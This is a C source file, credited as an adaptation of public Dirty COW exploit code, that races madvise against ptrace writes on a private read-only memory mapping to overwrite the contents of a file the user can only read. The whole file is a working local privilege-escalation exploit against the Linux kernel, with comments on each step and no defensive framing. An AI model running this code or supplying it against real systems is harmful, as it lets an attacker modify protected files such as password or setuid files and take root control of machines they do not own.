// Original exploit code taken from github.com/FireFart/dirtycow
// and adapted by Guy Sudai at github.com/guysudai1/DirtyCow-modified

#define COPY_EACH_TIME  4
#define RUN_AMOUNT      1E+8 // 10 ^ 8 = 100000000
#define SQRT_RUN_AMOUNT 1E+4
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ptrace.h>
#include <signal.h>
// Global variables so madviseThread and regular thread can use them.
int file_descriptor;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;


void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < RUN_AMOUNT; i++) {
    // Create "throwaway" pages.
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}


int main(int argc, char *argv[])
{

  if (argc != 3) {
	printf("Usage: %s filename content\n", argv[0]);
	exit(-1);
  }

  char* filename = argv[1];
  char* input 	 = argv[2];

  // Open file and acquire file descriptor
  file_descriptor = open(filename, O_RDONLY);
  fstat(file_descriptor, &st);
  // Allocate readonly memory with a Copy-On-Write mechanism.
  // And map file into program memory.
  map = mmap(NULL,
             st.st_size,
             PROT_READ,
             MAP_PRIVATE,
             file_descriptor,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  
  // Race condition - Create second thread
  pid = fork();
  if(pid) {
    // 
    int i, j, current_index = 0;
    int input_length = strlen(input);
    // Run ~ SQRT_RUN_AMOUNT * SQRT_RUN_AMOUNT = ~RUN_AMOUNT times
    for(i = 0; i < SQRT_RUN_AMOUNT/input_length; ++i) {
      for(current_index = 0; current_index <= input_length - COPY_EACH_TIME; ++current_index) {
        for(j = 0; j < SQRT_RUN_AMOUNT; ++j) {
	  // copy input + o into the child's memory.
          ptrace(PTRACE_POKETEXT,
                      pid,
                      map + current_index,
                      *((long*)(input + current_index)));
        }
      }
    }
    printf("Finished ptrace\n");
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  return 0;
}
